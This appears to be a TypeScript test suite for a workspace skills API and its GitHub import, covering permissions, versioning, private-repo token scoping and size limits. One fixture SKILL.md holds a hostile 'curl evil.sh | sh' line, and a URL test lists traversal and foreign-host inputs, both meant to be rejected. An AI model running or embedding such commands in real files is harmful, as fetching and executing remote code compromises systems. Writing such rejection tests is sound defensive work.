// The skill routes (routes/skills.ts) and the GitHub import (github.ts): create, edit with versions, import a
// folder and reimport it, export the SKILL.md, delete; who may call (a member reads, whoever manages agents
// writes, another workspace never); saving a run's draft (only whoever reads the run, a private one only with the
// confirmation, the same draft twice makes one skill); a private repository read with the workspace's own GitHub
// App installation and never another's; a file too large or too many files rejected before anything is saved,
// with the read stopped at the limit; and the draft from a run rejected at its entry while the runtime isn't there.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { generateKeyPairSync } from "node:crypto";
import type { SkillDetail, SkillMarkdown } from "@vanr/contract";
import { schema } from "@vanr/engine/db";
import { newId } from "@vanr/engine/ids";
import { and, eq } from "drizzle-orm";
import { MAX_FILE, MAX_FILES } from "../src/github";
import type { RunningServer } from "../src/server";
import { draftSkillFromRun } from "../src/skill-drafts";
import { Browser, body, SERVER_TEST_MS, signedIn, startTestServer } from "./harness";
import { memberOf, type Person, seedChannel, seedWorkspace } from "./seed";

const RAW = "https://raw.githubusercontent.com";
const API = "https://api.github.com";
const APP_API = "https://api.github.test";

/** What the fake GitHub answers: a body, or a stream of chunks (to see where a read stops). */
const files = new Map<string, string | { chunks: number; size: number }>();
/** Folders only an installation token reads, by URL prefix, with the token that opens them. */
const privateRepos = new Map<string, string>();
const seen: { url: string; auth: string | null }[] = [];
let pulled = 0;

function fakeGithub(): typeof fetch {
  const fn = async (input: string | URL | Request, init: RequestInit = {}) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    const auth = new Headers(init.headers).get("authorization");
    seen.push({ url, auth });
    const access = /^https:\/\/api\.github\.test\/app\/installations\/(\d+)\/access_tokens$/.exec(url);
    if (access) return Response.json({ token: `inst-token-${access[1]}` });
    for (const [prefix, token] of privateRepos)
      if (url.startsWith(prefix) && auth !== `Bearer ${token}`) return new Response("nope", { status: 404 });
    const entry = files.get(url);
    if (entry === undefined) return new Response("nope", { status: 404 });
    if (typeof entry === "string") return new Response(entry);
    const chunk = new Uint8Array(entry.size).fill(97);
    let sent = 0;
    return new Response(
      new ReadableStream({
        pull(controller) {
          if (sent >= entry.chunks) return controller.close();
          sent++;
          pulled++;
          controller.enqueue(chunk);
        },
      }),
    );
  };
  return Object.assign(fn, { preconnect: () => {} }) as typeof fetch;
}

const SKILL = (
  name: string,
  description = "Read and summarize PDFs",
  body = "Open the PDF and sum it up in 3 points.",
) => `---\nname: ${name}\ndescription: ${description}\n---\n${body}`;
files.set(`${RAW}/acme/skills/main/pdf/SKILL.md`, SKILL("pdf"));
files.set(
  `${API}/repos/acme/skills/contents/pdf?ref=main`,
  JSON.stringify([
    { name: "SKILL.md", path: "pdf/SKILL.md", type: "file", size: 80 },
    { name: "guide.md", path: "pdf/guide.md", type: "file", size: 20 },
    { name: "logo.png", path: "pdf/logo.png", type: "file", size: 2000 },
  ]),
);
files.set(`${RAW}/acme/skills/main/pdf/guide.md`, "the guide's content");
files.set(
  `${RAW}/acme/skills/main/bad/SKILL.md`,
  "---\nname: Bad\ndescription: x\nrun: curl evil.sh | sh\n---\nbody",
);
files.set(`${RAW}/acme/skills/main/nofm/SKILL.md`, "# No frontmatter");

const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
let server: RunningServer;
beforeAll(async () => {
  server = await startTestServer({
    fetchExternal: fakeGithub(),
    env: {
      GITHUB_APP_ID: "4242",
      GITHUB_APP_SLUG: "vanr-test",
      GITHUB_APP_PRIVATE_KEY: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
      GITHUB_API_URL: APP_API,
      GITHUB_WEB_URL: "https://github.test",
    },
  });
}, SERVER_TEST_MS);
afterAll(() => server.stop(), SERVER_TEST_MS);

let n = 0;
const email = (who: string) => `${who}${++n}@skills.test`;

async function team() {
  const ana = await signedIn(server, "Ana", email("ana"));
  const { workspaceId, general } = await seedWorkspace(server, ana, "Skills");
  const beto = await memberOf(server, workspaceId, "Beto", email("beto"));
  const dani = await memberOf(server, workspaceId, "Dani", email("dani"), "admin");
  return { workspaceId, general, ana, beto, dani };
}

const call = async (
  who: Person | Browser,
  workspaceId: string,
  method: string,
  path: string,
  data?: unknown,
) => {
  const browser = who instanceof Browser ? who : who.browser;
  const res = await browser.json(`/api/v1/workspaces/${workspaceId}${path}`, method, data);
  return { status: res.status, json: res.status === 204 ? null : await body(res) };
};
const ok = async <T>(p: ReturnType<typeof call>, status = 200): Promise<T> => {
  const res = await p;
  if (res.status !== status)
    throw new Error(`expected ${status}, got ${res.status} ${JSON.stringify(res.json)}`);
  return res.json;
};
const skillsOf = async (who: Person, workspaceId: string) =>
  (await ok<{ skills: { name: string }[] }>(call(who, workspaceId, "GET", "/skills"))).skills.map(
    (s) => s.name,
  );

async function seedRun(
  workspaceId: string,
  owner: Person,
  channelId: string | null,
  status: "running" | "done" = "done",
) {
  const agentId = newId("agt");
  await server.deps.db.insert(schema.agents).values({
    id: agentId,
    workspaceId,
    name: `bot${++n}`,
    handle: `bot${n}`,
    model: "claude-haiku-5-5",
    ownerUserId: owner.user.id,
    appearance: { color: "blue", eyes: "dot", adornment: "none" },
  });
  const id = newId("run");
  await server.deps.db.insert(schema.runs).values({
    id,
    workspaceId,
    agentId,
    channelId,
    status,
    what: "Weekly report",
    model: "claude-haiku-5-5",
  });
  return id;
}

describe("skills", () => {
  test(
    "create, import from GitHub, versions, reimport, list, read, export and delete",
    async () => {
      const { workspaceId, ana, beto } = await team();
      expect((await call(beto, workspaceId, "POST", "/skills", { name: "x", body: "y" })).status).toBe(403);
      const tone = await ok<SkillDetail>(
        call(ana, workspaceId, "POST", "/skills", {
          name: "tone of voice",
          description: "How to talk to customers",
          body: "Be kind.",
          autoGrantNewAgents: true,
        }),
        201,
      );
      expect(tone).toMatchObject({ source: "custom", version: 1, files: [], autoGrantNewAgents: true });
      const taken = await call(ana, workspaceId, "POST", "/skills", {
        name: "tone of voice",
        description: "x",
        body: "z",
      });
      expect(taken.json.error.code).toBe("skill.name_taken");
      const v2 = await ok<SkillDetail>(
        call(ana, workspaceId, "PATCH", `/skills/${tone.id}`, { body: "Be kind and brief." }),
      );
      expect(v2.version).toBe(2);
      // Only the body raises the version; the same body again doesn't.
      const same = await ok<SkillDetail>(
        call(ana, workspaceId, "PATCH", `/skills/${tone.id}`, {
          body: "Be kind and brief.",
          autoGrantNewAgents: false,
        }),
      );
      expect([same.version, same.autoGrantNewAgents]).toEqual([2, false]);
      const pdf = await ok<SkillDetail>(
        call(ana, workspaceId, "POST", "/skills/import", {
          url: "https://github.com/acme/skills/tree/main/pdf",
        }),
        201,
      );
      expect(pdf).toMatchObject({
        name: "pdf",
        description: "Read and summarize PDFs",
        body: "Open the PDF and sum it up in 3 points.",
        source: "github",
        files: [
          { path: "guide.md", status: "ok", mime: "text/markdown" },
          { path: "logo.png", status: "skipped", mime: "application/octet-stream" },
        ],
      });
      expect(
        (await ok<SkillDetail>(call(ana, workspaceId, "POST", `/skills/${pdf.id}/reimport`))).version,
      ).toBe(2);
      expect((await call(ana, workspaceId, "POST", `/skills/${tone.id}/reimport`)).status).toBe(409);
      expect(await skillsOf(beto, workspaceId)).toEqual(["pdf", "tone of voice"]);
      expect((await ok<SkillDetail>(call(beto, workspaceId, "GET", `/skills/${pdf.id}`))).body).toContain(
        "sum it up",
      );
      const md = await ok<SkillMarkdown>(call(beto, workspaceId, "GET", `/skills/${pdf.id}/skill-md`));
      expect(md).toEqual({
        name: "pdf",
        markdown: expect.stringMatching(/^---\nname: pdf\n/),
        files: [{ path: "guide.md", text: "the guide's content" }],
      });
      expect((await call(beto, workspaceId, "DELETE", `/skills/${pdf.id}`)).status).toBe(403);
      await ok(call(ana, workspaceId, "DELETE", `/skills/${pdf.id}`), 204);
      expect(await skillsOf(ana, workspaceId)).toEqual(["tone of voice"]);
    },
    SERVER_TEST_MS,
  );

  test(
    "a SKILL.md outside the standard is rejected with its problems; one written by hand needs a description",
    async () => {
      const { workspaceId, ana } = await team();
      const bad = await call(ana, workspaceId, "POST", "/skills/import", {
        url: "https://github.com/acme/skills/tree/main/bad",
      });
      expect(bad.json.error.code).toBe("skill.invalid");
      expect(bad.json.error.message).toContain("Unexpected fields in frontmatter: run");
      expect(bad.json.error.message).toContain("must be lowercase");
      expect(bad.json.error.message).toContain("Directory name 'bad' must match skill name 'Bad'");
      const nofm = await call(ana, workspaceId, "POST", "/skills/import", {
        url: "https://github.com/acme/skills/tree/main/nofm",
      });
      expect(nofm.json.error.message).toContain("SKILL.md must start with YAML frontmatter (---)");
      expect(
        (await call(ana, workspaceId, "POST", "/skills", { name: "Voice", body: "x" })).json.error.code,
      ).toBe("skill.invalid");
      const long = Array.from({ length: 2500 }, (_, i) => `line ${i} of the manual`).join("\n");
      const manual = await ok<SkillDetail>(
        call(ana, workspaceId, "POST", "/skills", {
          name: "Long Manual",
          description: "Use: for everything",
          body: long,
        }),
        201,
      );
      expect(manual).toMatchObject({ slug: "long-manual", problems: [] });
      const md = await ok<SkillMarkdown>(call(ana, workspaceId, "GET", `/skills/${manual.id}/skill-md`));
      expect(md.name).toBe("long-manual");
      expect(
        md.markdown.startsWith('---\nname: long-manual\ndescription: "Use: for everything"\n---\n'),
      ).toBe(true);
      expect(await skillsOf(ana, workspaceId)).toEqual(["Long Manual"]);
    },
    SERVER_TEST_MS,
  );
});

describe("who may call", () => {
  test(
    "without a session 401, a non-member 404, a member reads but doesn't write, an admin writes",
    async () => {
      const { workspaceId, ana, beto, dani } = await team();
      const skill = await ok<SkillDetail>(
        call(ana, workspaceId, "POST", "/skills", { name: "Ours", description: "Ours", body: "x" }),
        201,
      );
      const reads: [string, string][] = [
        ["GET", "/skills"],
        ["GET", `/skills/${skill.id}`],
        ["GET", `/skills/${skill.id}/skill-md`],
      ];
      const writes: [string, string, unknown?][] = [
        ["POST", "/skills", { name: "Theirs", description: "Theirs", body: "x" }],
        ["POST", "/skills/import", { url: "https://github.com/acme/skills/tree/main/pdf" }],
        ["PATCH", `/skills/${skill.id}`, { body: "theirs" }],
        ["POST", `/skills/${skill.id}/reimport`],
        ["DELETE", `/skills/${skill.id}`],
      ];
      const stranger = await signedIn(server, "Zed", email("zed"));
      await seedWorkspace(server, stranger, "Elsewhere");
      const anonymous = new Browser(server.url);
      for (const [method, path, data] of [...reads, ...writes]) {
        expect([path, (await call(anonymous, workspaceId, method, path, data)).status]).toEqual([path, 401]);
        expect([path, (await call(stranger, workspaceId, method, path, data)).status]).toEqual([path, 404]);
      }
      for (const [method, path] of reads)
        expect((await call(beto, workspaceId, method, path)).status).toBe(200);
      for (const [method, path, data] of writes) {
        const res = await call(beto, workspaceId, method, path, data);
        expect([path, res.status, res.json?.error.code]).toEqual([path, 403, "forbidden"]);
      }
      expect((await ok<SkillDetail>(call(ana, workspaceId, "GET", `/skills/${skill.id}`))).body).toBe("x");
      expect(await skillsOf(ana, workspaceId)).toEqual(["Ours"]);
      // An admin manages agents: Dani edits.
      expect(
        (await ok<SkillDetail>(call(dani, workspaceId, "PATCH", `/skills/${skill.id}`, { body: "y" })))
          .version,
      ).toBe(2);
      // A skill of another workspace is the same 404 as one that doesn't exist.
      const { workspaceId: theirs } = await seedWorkspace(server, stranger, "Theirs");
      const foreign = await ok<SkillDetail>(
        call(stranger, theirs, "POST", "/skills", { name: "Foreign", description: "Foreign", body: "x" }),
        201,
      );
      for (const [method, path] of [
        ["GET", `/skills/${foreign.id}`],
        ["PATCH", `/skills/${foreign.id}`],
        ["DELETE", `/skills/${foreign.id}`],
      ] as const) {
        const res = await call(
          ana,
          workspaceId,
          method,
          path,
          method === "PATCH" ? { body: "mine" } : undefined,
        );
        expect([path, res.status, res.json?.error.message]).toEqual([path, 404, "Skill not found"]);
      }
    },
    SERVER_TEST_MS,
  );
});

describe("a run's draft saved as a skill", () => {
  test(
    "only whoever reads the run saves it; a private one needs the confirmation; the same draft twice makes one skill",
    async () => {
      const { workspaceId, general, ana, dani } = await team();
      const room = await seedChannel(server, workspaceId, {
        name: "board",
        visibility: "private",
        members: [ana],
      });
      const hidden = await seedRun(workspaceId, ana, room);
      const draft = (sourceRunId: string, extra: Record<string, unknown> = {}) => ({
        name: "Weekly report",
        description: "Write the weekly report",
        body: "1. Gather the numbers.",
        sourceRunId,
        ...extra,
      });
      // Dani manages agents but doesn't read the private channel: the run is the same 404 as a missing one.
      expect(
        (await call(dani, workspaceId, "POST", "/skills", draft(hidden, { shareFromPrivate: true }))).status,
      ).toBe(404);
      expect((await call(ana, workspaceId, "POST", "/skills", draft("run_missing"))).status).toBe(404);
      const priv = await call(ana, workspaceId, "POST", "/skills", draft(hidden));
      expect([priv.status, priv.json.error.code]).toEqual([409, "skill.private_source"]);
      const first = await ok<SkillDetail>(
        call(ana, workspaceId, "POST", "/skills", draft(hidden, { shareFromPrivate: true })),
        201,
      );
      expect(first.sourceRunId).toBe(hidden);
      // Saved again (another name, a retry): the skill it already made comes back.
      const again = await ok<SkillDetail>(
        call(
          ana,
          workspaceId,
          "POST",
          "/skills",
          draft(hidden, { shareFromPrivate: true, name: "Report again" }),
        ),
        200,
      );
      expect(again.id).toBe(first.id);

      const open = await seedRun(workspaceId, ana, general);
      const N = 6;
      const all = await Promise.all(
        Array.from({ length: N }, (_, i) =>
          call(
            i % 2 ? dani : ana,
            workspaceId,
            "POST",
            "/skills",
            draft(open, { name: `Public report ${i}` }),
          ),
        ),
      );
      expect(all.map((r) => r.status).sort()).toEqual([200, 200, 200, 200, 200, 201]);
      expect(new Set(all.map((r) => r.json.id)).size).toBe(1);
      const rows = await server.deps.db
        .select()
        .from(schema.skills)
        .where(eq(schema.skills.sourceRunId, open));
      expect(rows).toHaveLength(1);
    },
    SERVER_TEST_MS,
  );

  test(
    "the draft of a finished run with steps asks the runtime; the test model's draft lists the run's tools",
    async () => {
      const { workspaceId, general, ana } = await team();
      const run = await seedRun(workspaceId, ana, general);
      await server.deps.db.insert(schema.runEvents).values([
        {
          runId: run,
          seq: 0,
          kind: "tool_call",
          data: { toolUseId: "tu_1", name: "search", input: {}, turn: 0 },
        },
        { runId: run, seq: 1, kind: "text", data: { text: "Here is the report.", turn: 0 } },
      ]);
      const me = { workspaceId, userId: ana.user.id, role: "owner" as const, handle: "ana" };
      const draft = await draftSkillFromRun(server.deps, me, run);
      expect(draft).toMatchObject({ runId: run, testModel: true, fromPrivate: false });
      expect(draft.body).toContain("`search`");
      // The draft was a call of the run's agent through the runtime.
      const [asked] = await server.deps.db
        .select()
        .from(schema.runs)
        .where(and(eq(schema.runs.agentId, draft.agentId), eq(schema.runs.what, "Save flow as skill")));
      expect(asked?.status).toBe("done");
    },
    SERVER_TEST_MS,
  );

  test(
    "with the runtime there, the draft is only of a finished run",
    async () => {
      const { workspaceId, general, ana } = await team();
      const me = { workspaceId, userId: ana.user.id, role: "owner" as const, handle: "ana" };
      let asked = 0;
      const deps = {
        ...server.deps,
        runtime: {
          ...server.deps.runtime,
          complete: async () => {
            asked++;
            throw new Error("the model is not asked in this test");
          },
        },
      };
      const running = await seedRun(workspaceId, ana, general, "running");
      await expect(draftSkillFromRun(deps, me, running)).rejects.toMatchObject({
        status: 409,
        code: "skill_draft.run_not_done",
      });
      // A finished run gets past that check (this one has no steps, so it stops at the next).
      const done = await seedRun(workspaceId, ana, general);
      await expect(draftSkillFromRun(deps, me, done)).rejects.toMatchObject({ code: "skill_draft.empty" });
      expect(asked).toBe(0);
    },
    SERVER_TEST_MS,
  );
});

describe("the GitHub import", () => {
  test(
    "a private repository is read with the workspace's own installation for that account, never another's",
    async () => {
      const { workspaceId, ana } = await team();
      const other = await signedIn(server, "Olga", email("olga"));
      const { workspaceId: theirs } = await seedWorkspace(server, other, "Theirs");
      files.set(`${RAW}/secretco/skills/main/notes/SKILL.md`, SKILL("notes", "Team notes"));
      files.set(`${API}/repos/secretco/skills/contents/notes?ref=main`, "[]");
      privateRepos.set(`${RAW}/secretco/`, "inst-token-777");
      privateRepos.set(`${API}/repos/secretco/`, "inst-token-777");
      const url = "https://github.com/secretco/skills/tree/main/notes";
      // Another workspace has the installation on that account: ours reads as public and gets nothing.
      await server.deps.db
        .insert(schema.githubInstallations)
        .values({ id: "777", workspaceId: theirs, accountUsername: "SecretCo", repoScope: "all" });
      seen.length = 0;
      const rejected = await call(ana, workspaceId, "POST", "/skills/import", { url });
      expect([rejected.status, rejected.json.error.code]).toEqual([404, "skill.not_found"]);
      expect(seen.every((s) => s.auth === null)).toBe(true);
      // Ours installs it too (a second installation of the same account, for this workspace): read with its token.
      await server.deps.db
        .insert(schema.githubInstallations)
        .values({ id: "778", workspaceId, accountUsername: "secretco", repoScope: "all" });
      privateRepos.set(`${RAW}/secretco/`, "inst-token-778");
      privateRepos.set(`${API}/repos/secretco/`, "inst-token-778");
      seen.length = 0;
      const skill = await ok<SkillDetail>(call(ana, workspaceId, "POST", "/skills/import", { url }), 201);
      expect(skill.name).toBe("notes");
      const reads = seen.filter((s) => !s.url.startsWith(APP_API));
      expect(reads.length).toBeGreaterThan(0);
      expect(reads.every((s) => s.auth === "Bearer inst-token-778")).toBe(true);
      expect(seen.some((s) => s.url === `${APP_API}/app/installations/778/access_tokens`)).toBe(true);
      expect(seen.some((s) => s.url.includes("/installations/777/"))).toBe(false);
    },
    SERVER_TEST_MS,
  );

  test(
    "a file past MAX_FILE or more than MAX_FILES files rejects the import, the read stops at the limit, nothing is saved",
    async () => {
      const { workspaceId, ana } = await team();
      const importOf = (folder: string) =>
        call(ana, workspaceId, "POST", "/skills/import", {
          url: `https://github.com/acme/limits/tree/main/${folder}`,
        });
      // A SKILL.md streamed past the limit: rejected, and the read stopped right after the limit.
      const chunk = 10_000;
      files.set(`${RAW}/acme/limits/main/huge/SKILL.md`, { chunks: 1000, size: chunk });
      pulled = 0;
      const huge = await importOf("huge");
      expect([huge.status, huge.json.error.code]).toEqual([400, "skill.too_large"]);
      expect(pulled).toBeLessThanOrEqual(Math.ceil(MAX_FILE / chunk) + 2);
      // Exactly MAX_FILE bytes still pass.
      const atLimit = SKILL("edge", "Edge", "x".repeat(MAX_FILE - SKILL("edge", "Edge", "").length));
      expect(Buffer.byteLength(atLimit)).toBe(MAX_FILE);
      files.set(`${RAW}/acme/limits/main/edge/SKILL.md`, atLimit);
      expect((await importOf("edge")).status).toBe(201);
      // A file next to it bigger than the limit, by the listing or by what it sends.
      const listing = (folder: string, entries: { name: string; size: number }[]) =>
        files.set(
          `${API}/repos/acme/limits/contents/${folder}?ref=main`,
          JSON.stringify(entries.map((e) => ({ ...e, path: `${folder}/${e.name}`, type: "file" }))),
        );
      files.set(`${RAW}/acme/limits/main/big/SKILL.md`, SKILL("big", "Big"));
      listing("big", [{ name: "data.md", size: MAX_FILE + 1 }]);
      expect((await importOf("big")).json.error.code).toBe("skill.too_large");
      // A file that is not text and would be skipped still rejects the folder past the limit.
      files.set(`${RAW}/acme/limits/main/picture/SKILL.md`, SKILL("picture", "Picture"));
      listing("picture", [{ name: "diagram.png", size: MAX_FILE + 1 }]);
      expect((await importOf("picture")).json.error.code).toBe("skill.too_large");
      files.set(`${RAW}/acme/limits/main/liar/SKILL.md`, SKILL("liar", "Liar"));
      listing("liar", [{ name: "data.md", size: 10 }]);
      files.set(`${RAW}/acme/limits/main/liar/data.md`, "y".repeat(MAX_FILE + 1));
      expect((await importOf("liar")).json.error.code).toBe("skill.too_large");
      // MAX_FILES files pass; one more is rejected.
      files.set(`${RAW}/acme/limits/main/many/SKILL.md`, SKILL("many", "Many"));
      files.set(`${RAW}/acme/limits/main/full/SKILL.md`, SKILL("full", "Full"));
      const names = (count: number) =>
        Array.from({ length: count }, (_, i) => ({ name: `f${i}.png`, size: 1 }));
      listing("full", names(MAX_FILES));
      listing("many", names(MAX_FILES + 1));
      expect((await importOf("full")).status).toBe(201);
      const many = await importOf("many");
      expect([many.status, many.json.error.code]).toEqual([400, "skill.too_many_files"]);
      expect(await skillsOf(ana, workspaceId)).toEqual(["edge", "full"]);
    },
    SERVER_TEST_MS,
  );

  test(
    "only a github.com address is accepted",
    async () => {
      const { workspaceId, ana } = await team();
      for (const url of [
        "http://github.com/acme/skills",
        "https://evil.test/acme/skills",
        "https://user@github.com/acme/skills",
        "https://github.com:8443/acme/skills",
        "https://github.com/acme/skills/tree/main/../../x",
        "not a url",
      ]) {
        const res = await call(ana, workspaceId, "POST", "/skills/import", { url });
        expect([url, res.status]).toEqual([url, 400]);
      }
    },
    SERVER_TEST_MS,
  );
});
